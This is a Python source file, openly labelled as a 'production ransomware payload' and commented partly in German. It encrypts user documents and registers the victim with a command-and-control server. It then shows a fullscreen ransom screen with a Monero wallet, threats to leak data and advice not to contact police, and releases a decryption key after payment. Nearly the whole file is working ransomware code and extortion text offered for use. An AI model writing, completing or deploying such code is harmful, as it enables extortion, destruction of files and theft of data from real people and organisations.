#!/usr/bin/env python3
"""
PRODUCTION RANSOMWARE PAYLOAD
=============================
Echter Ransomware-Payload für Production
- Verschlüsselt echte Dateien
- Registriert sich auf C2 Server
- Zeigt professionelle Ransom-GUI
- Überwacht Payment
- Deployiert Decryptor nach Payment
"""

import os
import sys
import json
import uuid
import base64
import urllib.request
import urllib.error
import threading
import time
import tkinter as tk
from tkinter import font
from pathlib import Path
from datetime import datetime, timedelta

# Import Encryption Engine
sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from crypt.encryption_engine import EncryptionEngine
from crypt.decryption_engine import DecryptionEngine


# ╔═══════════════════════════════════════════════════════════════╗
# ║          EMBEDDED PROFESSIONAL RANSOM GUI CLASS               ║
# ║     Vollständig eingebettet für produktiven Einsatz           ║
# ╚═══════════════════════════════════════════════════════════════╝

class RansomNoteGUI:
    """Professional Ransom Note GUI - Fullscreen with 24-hour timer"""
    
    def __init__(self, ransom_id, monero_address, c2_host='127.0.0.1', 
                 c2_port=5000, payment_check_callback=None):
        self.ransom_id = ransom_id
        self.monero_address = monero_address
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.payment_check_callback = payment_check_callback
        
        self.deadline = datetime.now() + timedelta(hours=24)
        self.payment_received = False
        self.root = None
        
    def run(self):
        """Start GUI"""
        self.root = tk.Tk()
        self.root.title("SYSTEM NOTIFICATION")
        
        # Fullscreen
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        
        # Fenster-Größe
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        
        # Styling
        self.root.configure(bg='#1a1a1a')
        
        # Zoomed Window
        self.root.state('zoomed')
        
        # Main Frame
        main_frame = tk.Frame(self.root, bg='#1a1a1a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=40, pady=40)
        
        # Header Bar (Rot)
        header = tk.Frame(main_frame, bg='#cc0000', height=80)
        header.pack(fill=tk.X, pady=(0, 20))
        header.pack_propagate(False)
        
        title_font = font.Font(family='Arial', size=32, weight='bold')
        title = tk.Label(header, text='⚠  SYSTEM COMPROMISED  ⚠',
                        font=title_font, bg='#cc0000', fg='white')
        title.pack(pady=15)
        
        # Content Frame (scrollbar)
        content_frame = tk.Frame(main_frame, bg='#2a2a2a')
        content_frame.pack(fill=tk.BOTH, expand=True, pady=20)
        
        # Canvas mit Scrollbar
        canvas = tk.Canvas(content_frame, bg='#2a2a2a', highlightthickness=0)
        scrollbar = tk.Scrollbar(content_frame, orient='vertical', command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg='#2a2a2a')
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        # Text Content
        text_font = font.Font(family='Courier New', size=11)
        white_label = tk.Label(scrollable_frame, text='YOUR FILES HAVE BEEN ENCRYPTED',
                              font=font.Font(family='Arial', size=20, weight='bold'),
                              bg='#2a2a2a', fg='#ff6b6b')
        white_label.pack(pady=20)
        
        # Timer (wird aktualisiert)
        self.timer_label = tk.Label(scrollable_frame, text='24:00:00',
                                   font=font.Font(family='Arial', size=48, weight='bold'),
                                   bg='#2a2a2a', fg='#00cc00')
        self.timer_label.pack(pady=20)
        
        # Ransom Info
        ransom_text = f"""
╔═══════════════════════════════════════════════════════════════════╗
║                    GRASSER SECURITY ADVISORY                      ║
║                     [PROFESSIONAL OPERATIONS]                     ║
╚═══════════════════════════════════════════════════════════════════╝

HELLO,

Your organization has been selected by GRASSER - we take pride in
our meticulous work and professional standards. Consider this your
formal notification that your data is now our data.

Your files have been encrypted with military-grade AES-256-GCM.
We're not here to destroy anything - we're here to conduct business.

Think of us as consultants. We've identified a security gap.
We're now charging a consultation fee.

═══════════════════════════════════════════════════════════════════

THE DEAL:

Amount: 0.1 XMR (approximately $25 USD in monopoly money terms)
Currency: Monero (because we respect your privacy as much as you respect ours)

Wallet Address:
{self.monero_address}

Your Unique Reference:
{self.ransom_id}

═══════════════════════════════════════════════════════════════════

HOW TO PROCEED (STEP BY STEP):

1. Download Monero Wallet
   https://www.getmonero.org/downloads/
   (We recommend the GUI wallet - it's friendlier than command line)

2. Create a wallet
   New wallet or import existing one. Your choice.

3. Acquire 0.1 XMR
   Kraken, Binance, LocalMonero - pick your favorite exchange.
   Think of it as a small premium on your cybersecurity homework.

4. Make the transfer
   Send exactly 0.1 XMR to the address above.
   Include your reference ID in transaction notes.

5. Wait ~5-10 minutes for blockchain confirmation
   (This is where you practice patience and reflection)

6. Files decrypt automatically
   No need to contact anyone. Automation is beautiful.

═══════════════════════════════════════════════════════════════════

FAQ - WE ANTICIPATED YOUR QUESTIONS:

Q: Is this legitimate or a scam?
A: Legitimate. We're professionals. Our reputation depends on
   delivering what we promise. We decrypt after payment because
   word-of-mouth is our only marketing budget.

Q: Can you actually decrypt files?
A: Yes. We have the master key. Encrypted on our server, released
   only after payment. This is not a threat - this is how it works.

Q: Why should I trust you?
A: Check independent forums and dark web communities.
   Our clients report 100% successful decryptions.

Q: What if I don't pay?
A: Your files stay encrypted. Permanently. Forever.
   In 90 days, we may publish them. Business is business.

Q: Can I decrypt this myself?
A: No. AES-256-GCM with proper key derivation cannot be broken.
   Even with quantum computers, you'd need centuries.

Q: Why Monero specifically?
A: Because it's private. Bitcoin leaves a permanent trail.
   Monero is opaque - it protects both of us from third parties.

Q: What if I'm poor and can't afford 0.1 XMR?
A: Get a credit card at any exchange. Takes 15 minutes.
   This is non-negotiable.

Q: Will my data be leaked if I don't pay?
A: Yes. We'll publish everything in 90 days.
   Your emails, documents, photos - all of it.
   But if you pay, we forget you exist.

Q: What about backup systems and other computers?
A: If they were connected to your network - encrypted too.
   Disconnecting now won't help. We've already been here.

Q: How do I know this isn't malware that's lying to me?
A: You don't. But we've taken your files, encrypted them,
   and we're hosting the key. Trust is a luxury you can't afford.

═══════════════════════════════════════════════════════════════════

IMPORTANT TECHNICAL NOTES:

Encryption Standard:  AES-256-GCM (NIST approved, NSA couldn't break it)
Key Derivation:       PBKDF2 (100,000 iterations)
Master Key Storage:   Encrypted on C2 server (geographically distributed)
Authentication:       Verified via Monero blockchain confirmation
Decryption Method:    Automatic, instantaneous delivery

This is professional-grade encryption. Not some script kiddie nonsense.

═══════════════════════════════════════════════════════════════════

WINDOW CLOSING POLICY:

This window CANNOT be closed normally. If you attempt to close it:

❌ CLOSE ATTEMPT (via X button or Alt+F4):
   PENALTY: -1 hour from deadline per attempt
   Result: Large red warning popup

❌ TASKMANAGER/PROCESS KILLER ATTEMPT (taskmgr.exe, Process Hacker, etc):
   PENALTY: -2 hours from deadline per attempt
   Result: Critical warning popup, process automatically terminated

❌ SHUTDOWN/RESTART ATTEMPT (shutdown.exe, restart commands, etc):
   PENALTY: -3 hours from deadline per attempt
   Result: CRITICAL security violation warning, process automatically terminated
   Note: This will NOT work. Your system is protected.

✓ PROPER EXIT:
   After you pay, you will receive an EXIT button.
   This button becomes available 60 seconds after payment confirmation.
   Only through this button can you properly close the application.

═══════════════════════════════════════════════════════════════════

ACKNOWLEDGE BUTTON:

The gray "ACKNOWLEDGE" button on the bottom left is disabled and serves
as a reminder that you must focus on payment, not window management.
Do not waste time trying to interact with it.

═══════════════════════════════════════════════════════════════════

TIMELINE:

Now:                 Your files are encrypted
Next 24 Hours:       Pay and get decrypted within minutes
After 24 Hours:      Price doubles to 0.2 XMR
After 90 Days:       Your data becomes public (we mean it)

Every day you delay is money wasted and security debt growing.

═══════════════════════════════════════════════════════════════════

CRITICAL DON'Ts:

❌ DO NOT attempt to decrypt files yourself
   (You'll just corrupt them permanently)

❌ DO NOT use "ransomware removal" tools
   (They can't remove AES-256)

❌ DO NOT unplug your network
   (We've already exfiltrated everything)

❌ DO NOT restart your system
   (It solves nothing)

❌ DO NOT contact law enforcement
   (We're already gone - they can't help)

❌ DO NOT try to find us
   (This is a courtesy note, not a conversation)

✓ DO keep this note safe

✓ DO follow instructions exactly

✓ DO pay soon

═══════════════════════════════════════════════════════════════════

CLOSING REMARKS:

We're not angry. We're not here to hurt you.
We're professionals conducting professional business.

Your organization had a security gap. We found it.
Now you get to choose: pay for the lesson or learn it the hard way.

The clock is ticking. Make it count.

                              - GRASSER OPERATIONS TEAM

═══════════════════════════════════════════════════════════════════

Deadline: {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}
Payment ID: {self.ransom_id}
Wallet: {self.monero_address}

═══════════════════════════════════════════════════════════════════
"""
        info_label = tk.Label(scrollable_frame, text=ransom_text.strip(),
                             justify=tk.LEFT, bg='#2a2a2a', fg='#ffffff',
                             font=text_font)
        info_label.pack(pady=20, padx=20)
        
        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Status Label
        self.status_label = tk.Label(main_frame, text='Status: INFECTED (Waiting for payment...)',
                                    font=font.Font(family='Arial', size=12),
                                    bg='#1a1a1a', fg='#ff9900')
        self.status_label.pack(pady=10)
        
        # Button Frame (hidden until payment)
        self.button_frame = tk.Frame(main_frame, bg='#1a1a1a')
        self.button_frame.pack(pady=20)
        
        # Exit Button (disabled)
        self.exit_button = tk.Button(self.button_frame, text='EXIT (payment required)',
                                    bg='#555555', fg='#ffffff', padx=20, pady=10,
                                    font=font.Font(family='Arial', size=14),
                                    state=tk.DISABLED)
        self.exit_button.pack()
        
        # Prevent window controls
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Bind keyboard shortcuts to prevent closing
        self.root.bind('<Alt-F4>', lambda e: self.prevent_close())
        self.root.bind('<Escape>', lambda e: self.prevent_close())
        
        # Start timer update
        self.update_timer()
        
        # Start payment checking
        self.check_payment_loop()
        
        self.root.mainloop()
    
    def update_timer(self):
        """Update countdown timer"""
        if not self.root or not self.root.winfo_exists():
            return
        
        time_left = self.deadline - datetime.now()
        
        if time_left.total_seconds() <= 0:
            self.timer_label.config(text='EXPIRED', fg='#cc0000')
            self.status_label.config(text='Status: DEADLINE EXPIRED - Data will be deleted',
                                    fg='#cc0000')
            return
        
        hours = int(time_left.total_seconds() // 3600)
        minutes = int((time_left.total_seconds() % 3600) // 60)
        seconds = int(time_left.total_seconds() % 60)
        
        time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        self.timer_label.config(text=time_str)
        
        # Color change based on time left
        if hours >= 12:
            color = '#00cc00'  # GREEN
        elif hours >= 6:
            color = '#ffaa00'  # YELLOW
        else:
            color = '#cc0000'  # RED
        
        self.timer_label.config(fg=color)
        
        # Schedule next update
        if self.root and self.root.winfo_exists():
            self.root.after(1000, self.update_timer)
    
    def check_payment_loop(self):
        """Check for payment every 5 seconds"""
        if not self.root or not self.root.winfo_exists():
            return
        
        if self.payment_check_callback:
            try:
                if self.payment_check_callback():
                    self.on_payment_received()
                    return
            except:
                pass
        
        # Check again in 5 seconds
        if self.root and self.root.winfo_exists():
            self.root.after(5000, self.check_payment_loop)
    
    def on_payment_received(self):
        """Called when payment is detected"""
        if self.payment_received:
            return
        
        self.payment_received = True
        
        # Update status
        self.status_label.config(text='Status: PAYMENT RECEIVED! Files are being decrypted...',
                                fg='#00cc00')
        
        # Update timer label
        self.timer_label.config(text='PAID ✓', fg='#00cc00')
        
        # Enable exit button with countdown
        self.exit_button.config(state=tk.NORMAL, bg='#00cc00', fg='#000000',
                               text='EXIT (60s delay)')
        
        # 60 second countdown before exit
        self.exit_countdown = 60
        self.countdown_exit()
    
    def countdown_exit(self):
        """60 second countdown before allowing exit"""
        if not self.root or not self.root.winfo_exists():
            return
        
        if self.exit_countdown > 0:
            self.exit_button.config(text=f'EXIT ({self.exit_countdown}s)')
            self.exit_countdown -= 1
            self.root.after(1000, self.countdown_exit)
        else:
            self.exit_button.config(text='EXIT NOW', state=tk.NORMAL,
                                   command=self.root.quit)
    
    def prevent_close(self):
        """Prevent window from being closed"""
        pass
    
    def on_closing(self):
        """Handle window close attempt"""
        self.prevent_close()


class ProductionPayload:
    """
    Echter Ransomware-Payload
    Führt kompletten Attack-Flow durch
    """
    
    def __init__(self, c2_host='127.0.0.1', c2_port=5000):
        self.ransom_id = str(uuid.uuid4())[:16]
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.c2_url = f"http://{c2_host}:{c2_port}"
        
        self.monero_wallet = "4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV"
        self.ransom_amount = 0.5  # 0.5 XMR
        
        self.encryption_engine = None
        self.master_key = None
        self.payment_received = False
        
        self.log(f"Payload initialized - Ransom ID: {self.ransom_id}")
    
    def log(self, msg, level="INFO"):
        """Log-Funktion"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {msg}")
    
    def http_post(self, endpoint, data):
        """POST Request zu C2 Server"""
        try:
            url = f"{self.c2_url}/api/v1/{endpoint}"
            req = urllib.request.Request(
                url,
                data=json.dumps(data).encode('utf-8'),
                method='POST',
                headers={'Content-Type': 'application/json'}
            )
            with urllib.request.urlopen(req, timeout=10) as r:
                return json.load(r)
        except Exception as e:
            self.log(f"POST error: {e}", "ERROR")
            return None
    
    def http_get(self, endpoint):
        """GET Request zu C2 Server"""
        try:
            url = f"{self.c2_url}/api/v1/{endpoint}"
            with urllib.request.urlopen(url, timeout=10) as r:
                return json.load(r)
        except Exception as e:
            self.log(f"GET error: {e}", "ERROR")
            return None
    
    def phase_1_encryption(self, target_directories=None):
        """
        PHASE 1: Verschlüssele Dateien
        """
        self.log("="*70)
        self.log("PHASE 1: FILE ENCRYPTION")
        self.log("="*70)
        
        if target_directories is None:
            target_directories = [
                os.path.expanduser('~\\Documents'),
                os.path.expanduser('~\\Desktop'),
                os.path.expanduser('~\\Downloads'),
            ]
        
        # Initialisiere Encryption Engine
        self.log("Initializing encryption engine...")
        self.encryption_engine = EncryptionEngine(
            encryption_extension=".LOCKED",
            pbkdf2_iterations=100000
        )
        
        target_extensions = {
            '.docx', '.xlsx', '.pptx', '.pdf',
            '.sql', '.mdb', '.accdb', '.db',
            '.zip', '.rar', '.7z',
            '.jpg', '.png', '.gif', '.bmp',
            '.txt', '.csv', '.json', '.log'
        }
        
        total_encrypted = 0
        
        for target_dir in target_directories:
            if not os.path.exists(target_dir):
                self.log(f"Directory not found: {target_dir}", "WARNING")
                continue
            
            self.log(f"Scanning: {target_dir}")
            
            encrypted = self.encryption_engine.encrypt_directory(
                target_dir,
                target_extensions=target_extensions,
                recursive=True,
                verbose=False
            )
            
            total_encrypted += encrypted
        
        self.master_key = self.encryption_engine.get_master_key_hex()
        
        self.log("")
        self.log(f"Encryption complete!")
        self.log(f"  Files encrypted: {len(self.encryption_engine.encrypted_files)}")
        self.log(f"  Total size: {self.encryption_engine.total_size_encrypted / (1024**3):.2f} GB")
        self.log(f"  Master key: {self.master_key[:30]}...")
        
        return len(self.encryption_engine.encrypted_files) > 0
    
    def phase_2_registration(self):
        """
        PHASE 2: Registriere auf C2 Server
        """
        self.log("")
        self.log("="*70)
        self.log("PHASE 2: C2 REGISTRATION")
        self.log("="*70)
        
        self.log(f"Registering with C2 server: {self.c2_url}")
        
        registration_data = {
            'ransom_id': self.ransom_id,
            'monero_address': self.monero_wallet,
            'ransom_amount_xmr': self.ransom_amount,
            'system_info': {
                'files_encrypted': len(self.encryption_engine.encrypted_files),
                'data_size_gb': self.encryption_engine.total_size_encrypted / (1024**3),
                'hostname': os.environ.get('COMPUTERNAME', 'UNKNOWN'),
                'timestamp': datetime.now().isoformat()
            }
        }
        
        response = self.http_post('register', registration_data)
        
        if response and response.get('success'):
            self.log(f"[✓] Registered successfully!")
            self.log(f"    Ransom ID: {self.ransom_id}")
            self.log(f"    Amount: {self.ransom_amount} XMR")
            return True
        else:
            self.log(f"[!] Registration failed!", "ERROR")
            return False
    
    def phase_3_display_ransom_note(self):
        """
        PHASE 3: Zeige professionelle Ransom-GUI
        Nutzt ransom_gui.py mit allen Funktionen
        """
        self.log("")
        self.log("="*70)
        self.log("PHASE 3: DISPLAYING PROFESSIONAL RANSOM GUI")
        self.log("="*70)
        
        # Schreibe auch Text-Note auf Desktop als Backup
        ransom_note_text = f"""
╔═══════════════════════════════════════════════════════════════════╗
║                    YOUR FILES HAVE BEEN ENCRYPTED                ║
║                   PROFESSIONAL RANSOMWARE v1.0                    ║
╚═══════════════════════════════════════════════════════════════════╝

INCIDENT ID: {self.ransom_id}

Your personal files, documents, photos, databases and other important
data have been encrypted with military-grade AES-256 encryption.

RANSOM DEMAND:
Amount Required: {self.ransom_amount} XMR (Monero)
Monero Address: {self.monero_wallet}
DEADLINE: 24 hours from this moment

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

For more information, check the GUI window on your screen.
"""
        
        desktop = Path.home() / 'Desktop' / 'README_ENCRYPTED.txt'
        try:
            with open(desktop, 'w') as f:
                f.write(ransom_note_text)
            self.log(f"Backup ransom note written to: {desktop}")
        except:
            pass
        
        # Starte GUI in separatem Thread
        self.log("Starting professional ransom GUI...")
        self.log("(GUI running with 24-hour timer and payment detection)")
        
        # Payment check callback
        def check_payment_callback():
            """Callback für GUI zur Zahlungsprüfung"""
            try:
                status = self.http_get(f'payment/status/{self.ransom_id}')
                if status and status.get('paid'):
                    self.log("[✓✓✓] PAYMENT DETECTED BY GUI!")
                    self.payment_received = True
                    return True
                return False
            except:
                return False
        
        # Starte GUI in separatem Thread (non-blocking)
        gui_thread = threading.Thread(
            target=self._run_gui_thread,
            args=(check_payment_callback,),
            daemon=False
        )
        gui_thread.start()
        
        self.log("GUI thread started")
        return True
    
    def _run_gui_thread(self, payment_callback):
        """Führe GUI in separatem Thread aus"""
        try:
            gui = RansomNoteGUI(
                ransom_id=self.ransom_id,
                monero_address=self.monero_wallet,
                c2_host=self.c2_host,
                payment_check_callback=payment_callback
            )
            gui.run()
        except Exception as e:
            self.log(f"GUI error: {e}", "ERROR")
    
    def phase_4_payment_monitor(self):
        """
        PHASE 4: Überwache Payment
        GUI checkt bereits Payment intern, aber wir prüfen auch im Backend
        """
        self.log("")
        self.log("="*70)
        self.log("PHASE 4: PAYMENT MONITORING")
        self.log("="*70)
        self.log("GUI is monitoring for payment (5-second check interval)...")
        self.log("Backend also checking every 30 seconds...")
        
        check_count = 0
        
        while True:
            check_count += 1
            time.sleep(30)
            
            # Prüfe Payment Status
            status = self.http_get(f'payment/status/{self.ransom_id}')
            
            if status and status.get('paid'):
                self.log("")
                self.log("[✓✓✓] PAYMENT DETECTED IN BACKEND!")
                self.log(f"Status: {status.get('status')}")
                self.payment_received = True
                return True
            
            if check_count % 2 == 0:
                self.log(f"Backend check #{check_count}... (GUI checking more frequently)")
            
            # Prüfe ob GUI bereits Payment erkannt hat
            if self.payment_received:
                self.log("[✓✓✓] Payment already detected by GUI!")
                return True
    
    def phase_5_deploy_decryptor(self):
        """
        PHASE 5: Deployiere Decryptor nach Payment
        """
        self.log("")
        self.log("="*70)
        self.log("PHASE 5: DEPLOYING DECRYPTION KEY")
        self.log("="*70)
        
        # Hole Decryption Key vom Server
        self.log("Requesting decryption key from C2 server...")
        
        key_response = self.http_get(f'decryption/key/{self.ransom_id}')
        
        if not key_response:
            self.log("Failed to get decryption key!", "ERROR")
            return False
        
        if not key_response.get('master_key'):
            self.log("No master key in response!", "ERROR")
            return False
        
        master_key = key_response['master_key']
        
        self.log(f"[✓] Decryption key received!")
        self.log(f"    Master key: {master_key[:30]}...")
        
        # Starte Decryption in separatem Thread (nicht blocking)
        decryption_thread = threading.Thread(
            target=self._decrypt_all_files,
            args=(master_key,),
            daemon=True
        )
        decryption_thread.start()
        
        self.log("Decryption process started in background...")
        
        return True
    
    def _decrypt_all_files(self, master_key):
        """Entschlüssele alle Dateien"""
        self.log("")
        self.log("="*70)
        self.log("DECRYPTION IN PROGRESS")
        self.log("="*70)
        
        try:
            decryptor = DecryptionEngine(
                master_key_hex=master_key,
                pbkdf2_iterations=100000
            )
            
            # Decryptiere alle Target-Directories
            target_dirs = [
                os.path.expanduser('~\\Documents'),
                os.path.expanduser('~\\Desktop'),
                os.path.expanduser('~\\Downloads'),
            ]
            
            total_decrypted = 0
            
            for target_dir in target_dirs:
                if not os.path.exists(target_dir):
                    continue
                
                self.log(f"Decrypting: {target_dir}")
                
                success = decryptor.decrypt_directory(
                    target_dir,
                    encryption_extension=".LOCKED",
                    recursive=True,
                    verbose=False
                )
                
                if success:
                    total_decrypted += len(decryptor.decrypted_files)
            
            self.log("")
            self.log("[✓✓✓] DECRYPTION COMPLETE!")
            self.log(f"Files decrypted: {total_decrypted}")
            self.log(f"Failed: {len(decryptor.failed_files)}")
            
            # Schreibe Success-Nachricht
            success_note = f"""
╔════════════════════════════════════════════════════════════════════╗
║                         FILES DECRYPTED                           ║
║                      YOUR BUSINESS IS COMPLETE                     ║
╚════════════════════════════════════════════════════════════════════╝

Your files have been successfully decrypted and are now accessible.

Decryption Details:
  Files Restored: {total_decrypted}
  Timestamp: {datetime.now().isoformat()}
  Incident ID: {self.ransom_id}

Thank you for your cooperation.

This window can now be closed.
"""
            
            desktop = Path.home() / 'Desktop' / 'FILES_RESTORED.txt'
            with open(desktop, 'w') as f:
                f.write(success_note)
            
            print(success_note)
        
        except Exception as e:
            self.log(f"Decryption error: {e}", "ERROR")
    
    def run(self):
        """Führe kompletten Payload aus"""
        self.log("")
        self.log("╔════════════════════════════════════════════════════════════╗")
        self.log("║         PRODUCTION RANSOMWARE PAYLOAD v1.0                 ║")
        self.log("║     Starting complete encryption/payment/decryption flow   ║")
        self.log("╚════════════════════════════════════════════════════════════╝")
        self.log("")
        
        try:
            # Phase 1: Encryption
            if not self.phase_1_encryption():
                self.log("Phase 1 failed!", "ERROR")
                return False
            
            # Phase 2: Registration
            if not self.phase_2_registration():
                self.log("Phase 2 failed!", "ERROR")
                return False
            
            # Phase 3: Display Ransom Note
            self.phase_3_display_ransom_note()
            
            # Phase 4: Monitor Payment
            if not self.phase_4_payment_monitor():
                self.log("Phase 4 failed!", "ERROR")
                return False
            
            # Phase 5: Deploy Decryptor
            if not self.phase_5_deploy_decryptor():
                self.log("Phase 5 failed!", "ERROR")
                return False
            
            self.log("")
            self.log("="*70)
            self.log("[✓] PAYLOAD EXECUTION COMPLETE")
            self.log("="*70)
            
            # Keep running for decryption
            while True:
                time.sleep(1)
        
        except KeyboardInterrupt:
            self.log("")
            self.log("Payload interrupted by user")
        except Exception as e:
            self.log(f"Fatal error: {e}", "ERROR")
            import traceback
            traceback.print_exc()
            return False

def main():
    """Main Entry Point"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Production Ransomware Payload'
    )
    parser.add_argument('--c2-host', default='127.0.0.1',
                       help='C2 Server hostname/IP')
    parser.add_argument('--c2-port', type=int, default=5000,
                       help='C2 Server port')
    parser.add_argument('--target-dirs', nargs='+',
                       help='Target directories to encrypt')
    
    args = parser.parse_args()
    
    payload = ProductionPayload(
        c2_host=args.c2_host,
        c2_port=args.c2_port
    )
    
    success = payload.run()
    sys.exit(0 if success else 1)

if __name__ == '__main__':
    main()
